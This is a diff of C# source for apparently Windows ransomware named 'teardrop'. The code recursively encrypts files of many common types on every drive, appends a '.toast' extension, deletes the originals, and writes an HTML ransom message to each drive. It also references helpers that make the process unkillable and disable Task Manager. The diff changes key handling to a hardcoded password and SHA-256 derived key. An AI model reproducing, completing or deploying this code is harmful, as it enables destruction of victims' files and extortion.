@@ -1,28 +1,29 @@
+using System.IO;
+using System.Security.Cryptography;
+
 namespace teardrop
 {
     public partial class FrmMain : Form
     {
-        private string _generatedKey = string.Empty;
         private const string _defaultExtension = ".toast";
         private const string _defaultMessage = "<h1>Title:</h1><p>Message</p>";
-
         private readonly IProgress<string> _notification;
         private readonly CancellationTokenSource _cancellationTokenSource;
-
-        private enum CypherMode
-        {
-            Encode,
-            Decode
-        }
-
-        private readonly string[] skipPaths = new[]
-        {
+        private readonly CryptoManager _cryptoManager;
+        private readonly char[] CHARS = [
+            'A','B','C','D','E','F','G','H','I', 'J',
+            'K','L','M','N','O','P','Q','R','S', 'T',
+            'U','V','W','X','Y','Z','0','1', '2','3',
+            '4','5','6','7','8','9','$','%', '#','@',
+            '*','&','+','-','[',']','?','/'
+        ];
+        private readonly string[] ignorePaths =
+        [
             "WinSxS", "Windows",  "System32", "Program Files",
             "Program Files (x86)", "System Volume Information"
-        };
-
-        private readonly string[] allowedExtensions = new[]
-        {
+        ];
+        private readonly string[] allowedExtensions =
+        [
             ".jpg", ".jpeg", ".gif", ".mp3", ".m4a", ".wav",
             ".pdf", ".raw", ".bat", ".json", ".doc", ".txt",
             ".png", ".cs", ".c", ".java", ".h", ".rar", ".zip",
@@ -34,31 +35,52 @@ namespace teardrop
             ".gz", ".zip", ".py", ".pl", ".bin", ".ai" ,".ico",
             ".asp", ".aspx", ".css", ".js", ".py", ".sh", ".vb",
             "java", ".cpp", ".cert", ".pem"
-        };
+        ];
+        private readonly int ZERO = 0;
+
+        private enum CypherMode
+        {
+            Encode,
+            Decode
+        }
 
         public FrmMain()
         {
             InitializeComponent();
+            string paswordKey = "?J2]]DS$]II+RQ+%*MFC1-7879D@PK3H%L1*URHJEB%R$RC&S-SQF4+?N8/LDM7/";// GetRandomString(64);
+            byte[] saltBytes = new byte[32];
+            Text = GetRandomString(50);
+            txtKey.Text = paswordKey;
+
             _notification = new Progress<string>(WriteLine);
+            RandomNumberGenerator.Create().GetBytes(saltBytes);
             _cancellationTokenSource = new CancellationTokenSource();
+            _cryptoManager = new CryptoManager(new CryptoSettings(GetHashBytes(GetKeyBytes(paswordKey)), saltBytes), _cancellationTokenSource.Token);
+            //ProcessManager.ProcessUnkillable();
+            //MachineManager.DisableTaskManager();
+        }
+        private static byte[] GetHashBytes(byte[] passwordBytes)
+        {
+            return SHA256.HashData(passwordBytes);
         }
 
-        private void Setup()
+        private static byte[] GetKeyBytes(string password)
         {
-            GenerateKey();
-            GenerateRandomApplicationName();
-            ProcessManager.ProcessUnkillable();
-            MachineManager.DisableTaskManager();
+            return System.Text.Encoding.Default.GetBytes(password);
         }
 
-        private void GenerateKey()
+        public string GetRandomString(uint length)
         {
-            _generatedKey = CryptoManager.GetRandomString(64);
-        }
+            char[] randomChars = new char[length];
 
-        private void GenerateRandomApplicationName()
-        {
-            Text = CryptoManager.GetRandomString(50);
+            Random random = new();
+
+            for (int index = ZERO; index < length; index++)
+            {
+                randomChars[index] = CHARS[random.Next(CHARS.Length)];
+            }
+
+            return new string(randomChars);
         }
 
         public void WriteLine(string text)
@@ -66,52 +88,57 @@ namespace teardrop
             txtBox.Text += $"[{DateTime.Now:yyyyy/MM/dd HH:mm:ss}] {text}{Environment.NewLine}";
         }
 
-        private async Task ChangeAllFilesAsync(string rootPath, CypherMode mode, IProgress<string> notification, CancellationToken cancellationToken)
+        private async Task ChangeAllFilesAsync(string rootPath, CypherMode mode, IProgress<string> notification)
         {
             try
             {
                 if ((File.GetAttributes(rootPath) & FileAttributes.ReparsePoint) is not FileAttributes.ReparsePoint)
                 {
                     string newFilePath = string.Empty;
-                    string defaultKey = _generatedKey;
+                    
+                    DirectoryInfo dirInfo = new(rootPath);
 
-                    foreach (string directory in GetValidDirectories(rootPath))
+                    foreach (string filePath in Directory.GetFiles(Path.GetFullPath(rootPath)))
                     {
-                        foreach (string filePath in Directory.GetFiles(Path.GetFullPath(directory)))
+                        if (ignorePaths.Contains(dirInfo.Name)) continue;
+
+                        string extension = Path.GetExtension(filePath);
+
+                        switch (mode)
                         {
-                            string extension = Path.GetExtension(filePath);
+                            case CypherMode.Encode:
+                                if (!IsValidExtension(extension)) break;
 
-                            switch (mode)
-                            {
-                                case CypherMode.Encode:
-                                    if (!IsValidExtension(extension)) break;
+                                newFilePath = FileManager.AddExtension(filePath, _defaultExtension);
 
-                                    newFilePath = FileManager.AddExtension(filePath, _defaultExtension);
+                                await _cryptoManager.EncodeFileAsync(filePath, newFilePath);
 
-                                    await CryptoManager.EncodeFileAsync(filePath, newFilePath, defaultKey, cancellationToken);
+                                notification.Report($@"Encrypted {filePath}");
 
-                                    notification.Report($@"Encrypted {filePath}");
+                                RemoveFile(filePath);
 
-                                    RemoveFile(filePath);
-                                    break;
+                                break;
 
-                                case CypherMode.Decode:
-                                    if (!FileManager.HasExtension(filePath, _defaultExtension)) break;
+                            case CypherMode.Decode:
+                                if (!FileManager.HasExtension(filePath, _defaultExtension)) break;
 
-                                    newFilePath = FileManager.RemoveExtension(filePath, _defaultExtension);
+                                newFilePath = FileManager.RemoveExtension(filePath, _defaultExtension);
 
-                                    await CryptoManager.DecodeFileAsync(filePath, newFilePath, defaultKey, _cancellationTokenSource.Token);
+                                await _cryptoManager.DecodeFileAsync(filePath, newFilePath);
 
-                                    notification.Report($"Decrypted {filePath}");
+                                notification.Report($"Decrypted {filePath}");
 
-                                    RemoveFile(filePath);
-                                    break;
+                                RemoveFile(filePath);
 
-                                default: throw new NotSupportedException();
-                            }
+                                break;
+
+                            default: throw new NotSupportedException();
                         }
 
-                        await ChangeAllFilesAsync(directory, mode, notification, cancellationToken);
+                        foreach (string directory in GetDirectories(rootPath))
+                        {
+                            await ChangeAllFilesAsync(directory, mode, notification);
+                        }
                     }
                 }
             }
@@ -126,9 +153,9 @@ namespace teardrop
             return allowedExtensions.Contains(extension.ToLower());
         }
 
-        private IEnumerable<string> GetValidDirectories(string path)
+        private static IEnumerable<string> GetDirectories(string path)
         {
-            return Directory.GetDirectories(path).Where(directory => !skipPaths.Contains(directory));
+            return Directory.GetDirectories(path);
         }
 
         private void RemoveFile(string filePath)
@@ -143,15 +170,15 @@ namespace teardrop
             }
         }
 
-        private async Task ManageDrivesAsync(CypherMode mode, IProgress<string> notification, CancellationToken cancellationToken)
+        private async Task ManageDrivesAsync(CypherMode mode, IProgress<string> notification)
         {
             foreach (DriveInfo drive in DriveInfo.GetDrives())
             {
-                await ChangeDriveAsync(drive, mode, notification, cancellationToken);
+                await ChangeDriveAsync(drive, mode, notification);
             }
         }
 
-        private async Task ChangeDriveAsync(DriveInfo drive, CypherMode mode, IProgress<string> notification, CancellationToken cancellationToken)
+        private async Task ChangeDriveAsync(DriveInfo drive, CypherMode mode, IProgress<string> notification)
         {
             notification.Report($@"Found drive {drive.Name}");
 
@@ -159,7 +186,7 @@ namespace teardrop
             {
                 if (!drive.IsReady) throw new AccessViolationException("Drive is not ready.");
 
-                await ChangeAllFilesAsync(drive.Name, mode, notification, cancellationToken);
+                await ChangeAllFilesAsync(drive.Name, mode, notification);
 
                 FileManager.WriteHtmlFile(drive.Name, _defaultMessage);
 
@@ -168,15 +195,6 @@ namespace teardrop
             {
                 notification.Report($@"Found drive {drive.Name}, but it's not ready. adicional info: {ex.Message}");
             }
-        }
-
-        private async void FrmMain_Load(object sender, EventArgs e)
-        {
-            Setup();
-            //await ChangeAllFilesAsync("C:/testDir", CypherMode.Encode, notification, _cancellationTokenSource.Token);
-            //await ChangeAllFilesAsync("C:/testDir", CypherMode.Decode, notification, _cancellationTokenSource.Token);
-
-            await ManageDrivesAsync(CypherMode.Encode, _notification, _cancellationTokenSource.Token);
         }
 
         private void FrmMain_FormClosing(object sender, FormClosingEventArgs e)
@@ -188,9 +206,8 @@ namespace teardrop
         {
             if (string.IsNullOrEmpty(txtKey.Text.Trim())) return;
 
-            _generatedKey = txtKey.Text;
-
-            await ManageDrivesAsync(CypherMode.Decode, _notification, _cancellationTokenSource.Token);
+            await ChangeAllFilesAsync("D:\\testDir", CypherMode.Decode, _notification);
+            //await ManageDrivesAsync(CypherMode.Decode, _notification, _cancellationTokenSource.Token);
         }
     }
 }
